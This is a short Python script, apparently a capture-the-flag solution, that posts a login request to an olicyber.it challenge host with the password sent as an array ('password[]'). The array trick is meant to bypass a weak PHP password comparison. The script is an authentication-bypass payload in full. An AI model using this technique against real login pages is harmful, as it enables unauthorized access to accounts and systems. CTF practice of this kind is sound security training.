import requests

url = "http://clogin.challs.olicyber.it/"

payload = {"password[]" : "random_input"}

r = requests.post(url, data=payload)

print(r.text)